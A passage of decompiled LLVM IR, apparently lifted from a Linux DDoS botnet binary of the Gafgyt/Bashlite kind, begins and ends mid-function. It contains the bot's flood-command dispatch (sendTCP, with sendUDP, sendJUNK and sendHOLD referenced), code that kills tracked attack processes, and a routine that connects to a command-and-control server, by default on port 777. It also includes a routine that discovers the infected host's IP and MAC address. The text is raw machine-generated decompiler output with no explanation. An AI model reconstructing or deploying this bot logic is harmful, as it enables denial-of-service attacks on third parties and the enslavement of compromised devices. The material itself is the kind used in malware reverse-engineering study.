  %v0_804cd82 = call i32 @listFork()
  store i32 %v0_804cd82, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cd87 = icmp eq i32 %v0_804cd82, 0
  %v1_804cd89 = icmp eq i1 %v1_804cd87, false
  %v0_804cdc6 = load i32, i32* @esp, align 4
  br i1 %v1_804cd89, label %dec_label_pc_804cdc6, label %dec_label_pc_804cd8b

dec_label_pc_804cd8b:                             ; preds = %dec_label_pc_804cd82
  %v5_804cd8b = icmp ult i32 %v0_804cdc6, 4
  store i1 %v5_804cd8b, i1* %cf.global-to-local, align 1
  %v7_804cda3 = inttoptr i32 %v2_804cce5 to i8*
  %v8_804cda3 = call i32 @sendTCP(i32 %storemerge16156, i32 %v1_804cca6, i32 %v1_804ccbd, i32 %v1_804ccd4, i8* %v7_804cda3, i32 %storemerge17, i32 %storemerge18)
  %v0_804cdab = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cdb4 = call i32 @__libc_close(i32 %v0_804cdab)
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804cdc1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804cdc6:                             ; preds = %dec_label_pc_804cd82
  %v5_804cdc6 = icmp ult i32 %v0_804cdc6, 8
  store i1 %v5_804cdc6, i1* %cf.global-to-local, align 1
  %v2_804cdd0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80529d4.47 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804cddb = icmp eq i32 %v2_804cdd0, 0
  %v1_804cddf = icmp eq i1 %v4_804cddb, false
  br i1 %v1_804cddf, label %dec_label_pc_804cd82, label %dec_label_pc_804ce2b

dec_label_pc_804cde3:                             ; preds = %dec_label_pc_804cd4b
  %v0_804cde3 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cde8 = icmp eq i32 %v0_804cde3, 0
  %v1_804cdea = icmp eq i1 %v1_804cde8, false
  br i1 %v1_804cdea, label %dec_label_pc_804cf8b, label %dec_label_pc_804cdf0

dec_label_pc_804cdf0:                             ; preds = %dec_label_pc_804cde3
  %v0_804cdf0 = load i32, i32* @esp, align 4
  %v5_804cdf0 = icmp ult i32 %v0_804cdf0, 4
  store i1 %v5_804cdf0, i1* %cf.global-to-local, align 1
  %v7_804ce08 = inttoptr i32 %v2_804cce5 to i8*
  %v8_804ce08 = call i32 @sendTCP(i32 %v2_804cc95, i32 %v1_804cca6, i32 %v1_804ccbd, i32 %v1_804ccd4, i8* %v7_804ce08, i32 %storemerge17, i32 %storemerge18)
  %v0_804ce10 = load i32, i32* @global_var_8055420.26, align 32
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804ce19 = call i32 @__libc_close(i32 %v0_804ce10)
  store i1 %v5_804cbfb, i1* %cf.global-to-local, align 1
  %v1_804ce26 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ce2b:                             ; preds = %dec_label_pc_804cd69, %dec_label_pc_804cdc6, %dec_label_pc_804cb81
  %v2_804ce2e = load i32, i32* %v1_804c50c, align 4
  %v4_804ce4b = inttoptr i32 %v2_804ce2e to i8*
  %v7_804ce5d = call i32 @_strncmp(i8* %v4_804ce4b, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8052a29.61, i32 0, i32 0), i32 9)
  %v8_804ce5d = urem i32 %v7_804ce5d, 2
  %v9_804ce5d = icmp eq i32 %v8_804ce5d, 0
  %v0_804ce5f = load i1, i1* %cf.global-to-local, align 1
  %v2_804ce5f = or i1 %v0_804ce5f, %v9_804ce5d
  %v3_804ce5f = zext i1 %v2_804ce5f to i32
  %v4_804ce5f = load i32, i32* @edx, align 4
  %v5_804ce5f = and i32 %v4_804ce5f, -256
  %v6_804ce5f = or i32 %v3_804ce5f, %v5_804ce5f
  %v7_804ce5f = xor i32 %v6_804ce5f, 1
  store i32 %v7_804ce5f, i32* %edx.global-to-local, align 4
  %v1_804ce67 = trunc i32 %v7_804ce5f to i8
  %v3_804ce67 = zext i1 %v0_804ce5f to i8
  %v15_804ce67 = icmp eq i8 %v1_804ce67, %v3_804ce67
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ce70 = icmp eq i1 %v15_804ce67, false
  br i1 %v1_804ce70, label %dec_label_pc_804cf3a, label %dec_label_pc_804cedd.preheader

dec_label_pc_804cedd.preheader:                   ; preds = %dec_label_pc_804ce2b
  br label %dec_label_pc_804cedd

dec_label_pc_804ce86:                             ; preds = %dec_label_pc_804cf1a, %dec_label_pc_804cedd
  %v2_804ce89 = mul i32 %storemerge, 4
  store i32 %v2_804ce89, i32* %edx.global-to-local, align 4
  %v0_804ce8e = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_804ce93 = add i32 %v0_804ce8e, %v2_804ce89
  %v1_804ce96 = inttoptr i32 %v2_804ce93 to i32*
  %v2_804ce96 = load i32, i32* %v1_804ce96, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ce98 = icmp eq i32 %v2_804ce96, 0
  br i1 %v1_804ce98, label %dec_label_pc_804ceda, label %dec_label_pc_804ce9c

dec_label_pc_804ce9c:                             ; preds = %dec_label_pc_804ce86
  %v9_804ce89 = and i32 %storemerge, 1073741824
  %v10_804ce89 = icmp ne i32 %v9_804ce89, 0
  store i1 %v10_804ce89, i1* %cf.global-to-local, align 1
  store i32 %v2_804ce89, i32* %edx.global-to-local, align 4
  %v2_804ceac = load i32, i32* %v1_804ce96, align 4
  store i32 %v2_804ceac, i32* @ebx, align 4
  %v0_804ceae = call i32 @__libc_getpid()
  %v0_804ceb3 = load i32, i32* @ebx, align 4
  %v7_804ceb3 = icmp ult i32 %v0_804ceb3, %v0_804ceae
  store i1 %v7_804ceb3, i1* %cf.global-to-local, align 1
  %v12_804ceb3 = icmp eq i32 %v0_804ceb3, %v0_804ceae
  br i1 %v12_804ceb3, label %dec_label_pc_804ceda, label %dec_label_pc_804ceb7

dec_label_pc_804ceb7:                             ; preds = %dec_label_pc_804ce9c
  store i32 %v2_804ce89, i32* %edx.global-to-local, align 4
  %v0_804cebf = load i32, i32* @global_var_805b4a8.30, align 8
  %v2_804cec4 = add i32 %v0_804cebf, %v2_804ce89
  %v1_804cec7 = inttoptr i32 %v2_804cec4 to i32*
  %v2_804cec7 = load i32, i32* %v1_804cec7, align 4
  %v0_804cec9 = load i32, i32* @esp, align 4
  %v5_804cec9 = icmp ult i32 %v0_804cec9, 8
  store i1 %v5_804cec9, i1* %cf.global-to-local, align 1
  %v2_804cecf = call i32 @kill(i32 %v2_804cec7, i32 9)
  %v0_804ced4 = load i32, i32* @esp, align 4
  %v2_804ced4 = icmp ugt i32 %v0_804ced4, -17
  store i1 %v2_804ced4, i1* %cf.global-to-local, align 1
  %v4_804ced7 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_804ceda

dec_label_pc_804ceda:                             ; preds = %dec_label_pc_804ce9c, %dec_label_pc_804ce86, %dec_label_pc_804ceb7
  %stack_var_-28.0 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804ce86 ], [ %stack_var_-28.1, %dec_label_pc_804ce9c ], [ %v4_804ced7, %dec_label_pc_804ceb7 ]
  %v4_804ceda = add i32 %storemerge, 1
  br label %dec_label_pc_804cedd

dec_label_pc_804cedd:                             ; preds = %dec_label_pc_804cedd.preheader, %dec_label_pc_804ceda
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_804ceda ], [ 0, %dec_label_pc_804cedd.preheader ]
  %storemerge = phi i32 [ %v4_804ceda, %dec_label_pc_804ceda ], [ 0, %dec_label_pc_804cedd.preheader ]
  %v0_804cef1 = load i32, i32* @global_var_8055428.28, align 8
  %v0_804cef6 = load i32, i32* @global_var_805542c.29, align 4
  store i32 %v0_804cef6, i32* %edx.global-to-local, align 4
  %v10_804cf0e = icmp ne i32 %v0_804cef6, 0
  store i1 %v10_804cf0e, i1* %cf.global-to-local, align 1
  br i1 %v10_804cf0e, label %dec_label_pc_804ce86, label %dec_label_pc_804cf1a

dec_label_pc_804cf1a:                             ; preds = %dec_label_pc_804cedd
  %v10_804cf2e = icmp ult i32 %storemerge, %v0_804cef1
  store i1 %v10_804cf2e, i1* %cf.global-to-local, align 1
  br i1 %v10_804cf2e, label %dec_label_pc_804ce86, label %dec_label_pc_804cf3a

dec_label_pc_804cf3a:                             ; preds = %dec_label_pc_804cf1a, %dec_label_pc_804ce2b
  %v2_804cf3d = load i32, i32* %v1_804c50c, align 4
  %v4_804cf5a = inttoptr i32 %v2_804cf3d to i8*
  store i32 ptrtoint ([10 x i8]* @global_var_8052a32.62 to i32), i32* @edi, align 4
  %v7_804cf6c = call i32 @_strncmp(i8* %v4_804cf5a, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052a32.62, i32 0, i32 0), i32 10)
  %v8_804cf6c = urem i32 %v7_804cf6c, 2
  %v9_804cf6c = icmp eq i32 %v8_804cf6c, 0
  %v0_804cf6e = load i1, i1* %cf.global-to-local, align 1
  %v2_804cf6e = or i1 %v0_804cf6e, %v9_804cf6c
  %v3_804cf6e = zext i1 %v2_804cf6e to i32
  %v4_804cf6e = load i32, i32* %edx.global-to-local, align 4
  %v5_804cf6e = and i32 %v4_804cf6e, -256
  %v6_804cf6e = or i32 %v3_804cf6e, %v5_804cf6e
  %v7_804cf6e = xor i32 %v6_804cf6e, 1
  store i32 %v7_804cf6e, i32* %edx.global-to-local, align 4
  %v1_804cf76 = trunc i32 %v7_804cf6e to i8
  %v3_804cf76 = zext i1 %v0_804cf6e to i8
  %v4_804cf76 = sub nsw i8 %v1_804cf76, %v3_804cf76
  %v15_804cf76 = icmp eq i8 %v4_804cf76, 0
  %v2_804cf7a = sext i8 %v4_804cf76 to i32
  store i32 %v2_804cf7a, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cf7f = icmp eq i1 %v15_804cf76, false
  br i1 %v1_804cf7f, label %dec_label_pc_804cf8b, label %dec_label_pc_804cf81

dec_label_pc_804cf81:                             ; preds = %dec_label_pc_804cf3a
  %v0_804cf81 = load i32, i32* @esp, align 4
  %v5_804cf81 = icmp ult i32 %v0_804cf81, 12
  store i1 %v5_804cf81, i1* %cf.global-to-local, align 1
  %v1_804cf86 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804cf8b

dec_label_pc_804cf8b:                             ; preds = %dec_label_pc_804cc72, %dec_label_pc_804c9f7, %dec_label_pc_804c7d7, %dec_label_pc_804c651, %dec_label_pc_804cbcc, %dec_label_pc_804c937, %dec_label_pc_804c7b1, %dec_label_pc_804c62b, %dec_label_pc_804cde3, %dec_label_pc_804cc50, %dec_label_pc_804cc2d, %dec_label_pc_804cc10, %dec_label_pc_804cbf3, %dec_label_pc_804cbd6, %dec_label_pc_804cb3c, %dec_label_pc_804c9d4, %dec_label_pc_804c9b5, %dec_label_pc_804c998, %dec_label_pc_804c97b, %dec_label_pc_804c95e, %dec_label_pc_804c941, %dec_label_pc_804c8b0, %dec_label_pc_804c7bb, %dec_label_pc_804c72a, %dec_label_pc_804c635, %dec_label_pc_804cf3a, %dec_label_pc_804c5b2, %dec_label_pc_804c550, %dec_label_pc_804cf81
  %v0_804cf92 = phi i32 [ %v1_804cc7e, %dec_label_pc_804cc72 ], [ %v1_804ca03, %dec_label_pc_804c9f7 ], [ %v1_804c7e3, %dec_label_pc_804c7d7 ], [ %v1_804c65d, %dec_label_pc_804c651 ], [ %v2_804cbc1, %dec_label_pc_804cbcc ], [ %v2_804c92c, %dec_label_pc_804c937 ], [ %v2_804c7a6, %dec_label_pc_804c7b1 ], [ %v2_804c620, %dec_label_pc_804c62b ], [ %v0_804cde3, %dec_label_pc_804cde3 ], [ %v1_804cc5c, %dec_label_pc_804cc50 ], [ %v1_804cc39, %dec_label_pc_804cc2d ], [ -1, %dec_label_pc_804cc10 ], [ -1, %dec_label_pc_804cbf3 ], [ -1, %dec_label_pc_804cbd6 ], [ %v0_804cb3c, %dec_label_pc_804cb3c ], [ %v1_804c9e0, %dec_label_pc_804c9d4 ], [ %v1_804c9c1, %dec_label_pc_804c9b5 ], [ -1, %dec_label_pc_804c998 ], [ -1, %dec_label_pc_804c97b ], [ -1, %dec_label_pc_804c95e ], [ -1, %dec_label_pc_804c941 ], [ %v0_804c8b0, %dec_label_pc_804c8b0 ], [ %v1_804c7c7, %dec_label_pc_804c7bb ], [ %v0_804c72a, %dec_label_pc_804c72a ], [ %v1_804c641, %dec_label_pc_804c635 ], [ %v2_804cf7a, %dec_label_pc_804cf3a ], [ %v2_804c5d3, %dec_label_pc_804c5b2 ], [ %v2_804c55e, %dec_label_pc_804c550 ], [ %v1_804cf86, %dec_label_pc_804cf81 ]
  %v2_804cf8e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cf8e, i32* @ebx, align 4
  store i32 %v0_804c501, i32* @esi, align 4
  store i32 %v0_804c500, i32* @edi, align 4
  ret i32 %v0_804cf92

; uselistorder directives
  uselistorder i1 %v0_804cf6e, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-28.1, { 0, 2, 1 }
  uselistorder i32 %v2_804ce89, { 4, 2, 1, 3, 0 }
  uselistorder i1 %v0_804ce5f, { 1, 0 }
  uselistorder i32 %v2_804cdd0, { 1, 0 }
  uselistorder i32 %v0_804cdc6, { 1, 0 }
  uselistorder i1 %v5_804cd57, { 1, 0 }
  uselistorder i32 %v2_804cc95, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804cc7e, { 1, 0 }
  uselistorder i32 %v1_804cc41, { 1, 0 }
  uselistorder i32 %v1_804cc39, { 1, 0, 4, 2, 3 }
  uselistorder i1 %v5_804cbfb, { 3, 2, 1, 0, 13, 10, 9, 8, 12, 11, 7, 6, 5, 4 }
  uselistorder i1 %v0_804cbb5, { 1, 0 }
  uselistorder i32 %v2_804cb29, { 1, 0 }
  uselistorder i1 %v5_804cab3, { 1, 0 }
  uselistorder i32 %v2_804ca1a, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804ca03, { 1, 0 }
  uselistorder i32 %v1_804c9e8, { 1, 0 }
  uselistorder i32 %v1_804c9e0, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v1_804c9c9, { 1, 0 }
  uselistorder i32 %v1_804c9c1, { 1, 0, 4, 2, 3 }
  uselistorder i1 %v5_804c966, { 3, 2, 1, 0, 13, 12, 11, 10, 14, 9, 8, 7, 6, 5, 4 }
  uselistorder i1 %v0_804c920, { 1, 0 }
  uselistorder i32 %v2_804c89d, { 1, 0 }
  uselistorder i32 %v0_804c893, { 1, 0 }
  uselistorder i32 %v2_804c7fa, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804c7e3, { 1, 0 }
  uselistorder i1 %v5_804c7df, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 %v1_804c7c7, { 1, 0 }
  uselistorder i1 %v0_804c79a, { 1, 0 }
  uselistorder i32 %v2_804c717, { 1, 0 }
  uselistorder i32 %v0_804c70d, { 1, 0 }
  uselistorder i32 %v2_804c674, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804c65d, { 1, 0 }
  uselistorder i1 %v5_804c659, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 %v1_804c641, { 1, 0 }
  uselistorder i1 %v0_804c614, { 1, 0 }
  uselistorder i1 %v0_804c59f, { 1, 0 }
  uselistorder i1 %v0_804c53d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-268, { 0, 1, 2, 3, 6, 4, 7, 5, 8 }
  uselistorder i32 %tmp119, { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp109, { 0, 12, 2, 3, 11, 1, 10, 4, 9, 5, 8, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 5, 10, 9, 6, 7, 8, 11, 1, 0, 2, 3, 4 }
  uselistorder i1* %cf.global-to-local, { 130, 131, 139, 132, 138, 133, 134, 135, 136, 137, 140, 37, 141, 142, 2, 3, 9, 4, 5, 6, 7, 8, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 143, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 128, 39, 40, 41, 42, 46, 44, 45, 43, 129, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 144, 74, 75, 76, 77, 83, 78, 79, 80, 81, 82, 145, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 115, 95, 96, 97, 98, 104, 99, 100, 101, 102, 103, 0, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 116, 120, 117, 118, 119, 121, 124, 122, 123, 125, 126, 127 }
  uselistorder i32 (i32, i32, i32, i32, i8*, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80529d4.47 to i32), { 7, 0, 6, 1, 5, 2, 4, 3, 8, 9 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 1, 0 }
  uselistorder i32 252, { 1, 0 }
  uselistorder label %dec_label_pc_804cf8b, { 28, 25, 8, 0, 9, 10, 11, 12, 13, 4, 14, 1, 15, 16, 17, 18, 19, 20, 5, 21, 2, 22, 6, 23, 3, 24, 7, 26, 27 }
  uselistorder label %dec_label_pc_804cedd, { 1, 0 }
  uselistorder label %dec_label_pc_804ceda, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ce2b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cd82, { 1, 0 }
  uselistorder label %dec_label_pc_804cd4b, { 1, 0 }
  uselistorder label %dec_label_pc_804cd16, { 1, 0 }
  uselistorder label %dec_label_pc_804cc8f, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cb81, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cade, { 1, 0 }
  uselistorder label %dec_label_pc_804caa7, { 1, 0 }
  uselistorder label %dec_label_pc_804c8ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c85b, { 1, 0 }
  uselistorder label %dec_label_pc_804c766, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c6d5, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-520 = alloca i32, align 4
  %v2_804cf9c = ptrtoint i32* %stack_var_-520 to i32
  %v3_804cfb0 = bitcast i32* %stack_var_-520 to i8*
  %v4_804cfb0 = call i32 @__GI_memset(i8* %v3_804cfb0, i32 0, i32 512)
  %v0_804cfb8 = load i32, i32* @global_var_8055420.26, align 32
  %v1_804cfbd = icmp eq i32 %v0_804cfb8, 0
  br i1 %v1_804cfbd, label %dec_label_pc_804cfdc, label %dec_label_pc_804cfc1

dec_label_pc_804cfc1:                             ; preds = %entry
  %v1_804cfca = call i32 @__libc_close(i32 %v0_804cfb8)
  store i32 0, i32* @global_var_8055420.26, align 32
  br label %dec_label_pc_804cfdc

dec_label_pc_804cfdc:                             ; preds = %entry, %dec_label_pc_804cfc1
  %v0_804cfdc = load i32, i32* @global_var_8055144.63, align 4
  %v1_804cfe1 = icmp eq i32 %v0_804cfdc, 0
  %v1_804cfe3 = icmp eq i1 %v1_804cfe1, false
  br i1 %v1_804cfe3, label %dec_label_pc_804cff1, label %dec_label_pc_804cffc

dec_label_pc_804cff1:                             ; preds = %dec_label_pc_804cfdc
  %v1_804cff6 = add i32 %v0_804cfdc, 1
  br label %dec_label_pc_804cffc

dec_label_pc_804cffc:                             ; preds = %dec_label_pc_804cfdc, %dec_label_pc_804cff1
  %storemerge = phi i32 [ %v1_804cff6, %dec_label_pc_804cff1 ], [ 0, %dec_label_pc_804cfdc ]
  store i32 %storemerge, i32* @global_var_8055144.63, align 4
  %v1_804d001 = mul i32 %storemerge, 4
  %v2_804d001 = add i32 %v1_804d001, ptrtoint ([19 x i8]** @global_var_8055140.65 to i32)
  %v3_804d001 = inttoptr i32 %v2_804d001 to i32*
  %v4_804d001 = load i32, i32* %v3_804d001, align 4
  store i32 %v4_804d001, i32* @eax, align 4
  %v3_804d013 = call i32 @strcpy(i8* %v3_804cfb0, i32 %v4_804d001)
  %v3_804d02e = call i32 @__GI_strchr(i8* %v3_804cfb0, i32 58)
  %v1_804d036 = icmp eq i32 %v3_804d02e, 0
  br i1 %v1_804d036, label %dec_label_pc_804d075, label %dec_label_pc_804d03a

dec_label_pc_804d03a:                             ; preds = %dec_label_pc_804cffc
  %v3_804d046 = call i32 @__GI_strchr(i8* %v3_804cfb0, i32 58)
  %v1_804d04e = add i32 %v3_804d046, 1
  %v1_804d053 = call i32 @atol(i32 %v1_804d04e)
  %v3_804d06a = call i32 @__GI_strchr(i8* %v3_804cfb0, i32 58)
  %v4_804d06a = inttoptr i32 %v3_804d06a to i8*
  store i8 0, i8* %v4_804d06a, align 1
  br label %dec_label_pc_804d075

dec_label_pc_804d075:                             ; preds = %dec_label_pc_804cffc, %dec_label_pc_804d03a
  %stack_var_-8.0 = phi i32 [ 777, %dec_label_pc_804cffc ], [ %v1_804d053, %dec_label_pc_804d03a ]
  %v3_804d07e = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804d07e, i32* @global_var_8055420.26, align 32
  %v4_804d09e = call i32 @connectTimeout(i32 %v3_804d07e, i32 %v2_804cf9c, i32 %stack_var_-8.0, i32 30)
  %v1_804d0a6 = icmp eq i32 %v4_804d09e, 0
  %. = zext i1 %v1_804d0a6 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 (i32)* @atol, { 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d075, { 1, 0 }
  uselistorder label %dec_label_pc_804cffc, { 1, 0 }
  uselistorder label %dec_label_pc_804cfdc, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4204 = alloca i32, align 4
  %v5_804d0da = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804d0e5 = icmp eq i32 %v5_804d0da, -1
  %v1_804d0e9 = icmp eq i1 %v13_804d0e5, false
  br i1 %v1_804d0e9, label %dec_label_pc_804d0fa, label %dec_label_pc_804d2bd

dec_label_pc_804d0fa:                             ; preds = %entry
  %v2_804d0fa = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804d126 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8052a3c.66 to i32))
  %v2_804d136 = call i32 @htons(i32 53)
  %v5_804d14e = call i32 @__libc_connect(i32 %v5_804d0da, i32 %v2_804d0fa, i32 16)
  %v13_804d159 = icmp eq i32 %v5_804d14e, -1
  %v1_804d15d = icmp eq i1 %v13_804d159, false
  br i1 %v1_804d15d, label %dec_label_pc_804d16e, label %dec_label_pc_804d2bd

dec_label_pc_804d16e:                             ; preds = %dec_label_pc_804d0fa
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804d175 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804d17b = ptrtoint i32* %stack_var_-60 to i32
  %v5_804d183 = call i32 @__GI_getsockname(i32 %v5_804d0da, i32 %v2_804d175, i32 %v2_804d17b)
  %v13_804d18e = icmp eq i32 %v5_804d183, -1
  %v1_804d192 = icmp eq i1 %v13_804d18e, false
  br i1 %v1_804d192, label %dec_label_pc_804d1a3, label %dec_label_pc_804d2bd

dec_label_pc_804d1a3:                             ; preds = %dec_label_pc_804d16e
  %v5_804d1b5 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8052a44.67, i32 0, i32 0), i32 0)
  %v2_804d218 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804d22a51 = call i32 @fdgets(i32 %v2_804d218, i32 4096, i32 %v5_804d1b5)
  %v1_804d23252 = icmp eq i32 %v5_804d22a51, 0
  %v1_804d23453 = icmp eq i1 %v1_804d23252, false
  br i1 %v1_804d23453, label %dec_label_pc_804d1c2, label %dec_label_pc_804d236

dec_label_pc_804d1c2:                             ; preds = %dec_label_pc_804d1a3, %dec_label_pc_804d1fc
  %v5_804d1d1 = call i32 @strstr(i32 %v2_804d218, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8052a54.68, i32 0, i32 0))
  %v1_804d1d9 = icmp eq i32 %v5_804d1d1, 0
  br i1 %v1_804d1d9, label %dec_label_pc_804d1fc, label %dec_label_pc_804d1eb.preheader

dec_label_pc_804d1eb.preheader:                   ; preds = %dec_label_pc_804d1c2
  %v2_804d1ee42 = load i8, i8* %stack_var_-4156, align 1
  %v10_804d1f047 = icmp eq i8 %v2_804d1ee42, 9
  %v1_804d1f248 = icmp eq i1 %v10_804d1f047, false
  br i1 %v1_804d1f248, label %dec_label_pc_804d1e8, label %dec_label_pc_804d1f4

dec_label_pc_804d1e8:                             ; preds = %dec_label_pc_804d1eb.preheader, %dec_label_pc_804d1e8
  %v4_804d1eb49 = phi i32 [ %v5_804d1e8, %dec_label_pc_804d1e8 ], [ %v2_804d218, %dec_label_pc_804d1eb.preheader ]
  %v5_804d1e8 = add i32 %v4_804d1eb49, 1
  %v22_804d1e8 = inttoptr i32 %v5_804d1e8 to i8*
  %v2_804d1ee = load i8, i8* %v22_804d1e8, align 1
  %v10_804d1f0 = icmp eq i8 %v2_804d1ee, 9
  %v1_804d1f2 = icmp eq i1 %v10_804d1f0, false
  br i1 %v1_804d1f2, label %dec_label_pc_804d1e8, label %dec_label_pc_804d1f4

dec_label_pc_804d1f4:                             ; preds = %dec_label_pc_804d1e8, %dec_label_pc_804d1eb.preheader
  %storemerge5.lcssa = phi i8* [ %stack_var_-4156, %dec_label_pc_804d1eb.preheader ], [ %v22_804d1e8, %dec_label_pc_804d1e8 ]
  store i8 0, i8* %storemerge5.lcssa, align 1
  br label %dec_label_pc_804d236

dec_label_pc_804d1fc:                             ; preds = %dec_label_pc_804d1c2
  %v6_804d210 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804d22a = call i32 @fdgets(i32 %v2_804d218, i32 4096, i32 %v5_804d1b5)
  %v1_804d232 = icmp eq i32 %v5_804d22a, 0
  %v1_804d234 = icmp eq i1 %v1_804d232, false
  br i1 %v1_804d234, label %dec_label_pc_804d1c2, label %dec_label_pc_804d236

dec_label_pc_804d236:                             ; preds = %dec_label_pc_804d1a3, %dec_label_pc_804d1fc, %dec_label_pc_804d1f4
  %v2_804d23c = call i32 @__libc_close(i32 %v5_804d1b5)
  %v3_804d244 = load i8, i8* %stack_var_-4156, align 1
  %v4_804d24a = icmp eq i8 %v3_804d244, 0
  br i1 %v4_804d24a, label %dec_label_pc_804d2ad, label %dec_label_pc_804d24e

dec_label_pc_804d24e:                             ; preds = %dec_label_pc_804d236
  %v2_804d258 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804d258, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804d25f = call i32 @strcpy(i8* %tmp39, i32 %v2_804d218)
  %v5_804d279 = call i32 @ioctl(i32 %v5_804d0da, i32 35111, i32 %v2_804d258)
  %v2_804d293 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804d28a

dec_label_pc_804d28a:                             ; preds = %dec_label_pc_804d24e, %dec_label_pc_804d28a
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804d24e ], [ %v4_804d2a4, %dec_label_pc_804d28a ]
  %v2_804d299 = add i32 %storemerge40, %v2_804d293
  %v1_804d29c = inttoptr i32 %v2_804d299 to i8*
  %v2_804d29c = load i8, i8* %v1_804d29c, align 1
  %v3_804d29e = add i32 %storemerge40, ptrtoint (i8** @global_var_8055430.69 to i32)
  %v4_804d29e = inttoptr i32 %v3_804d29e to i8*
  store i8 %v2_804d29c, i8* %v4_804d29e, align 1
  %v4_804d2a4 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804d2a4, 6
  br i1 %exitcond, label %dec_label_pc_804d2ad.loopexit, label %dec_label_pc_804d28a

dec_label_pc_804d2ad.loopexit:                    ; preds = %dec_label_pc_804d28a
  br label %dec_label_pc_804d2ad

dec_label_pc_804d2ad:                             ; preds = %dec_label_pc_804d2ad.loopexit, %dec_label_pc_804d236
  %v2_804d2b3 = call i32 @__libc_close(i32 %v5_804d0da)
  %v3_804d2c9.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804d2c9

dec_label_pc_804d2bd:                             ; preds = %dec_label_pc_804d16e, %dec_label_pc_804d0fa, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804d2c9

dec_label_pc_804d2c9:                             ; preds = %dec_label_pc_804d2ad, %dec_label_pc_804d2bd
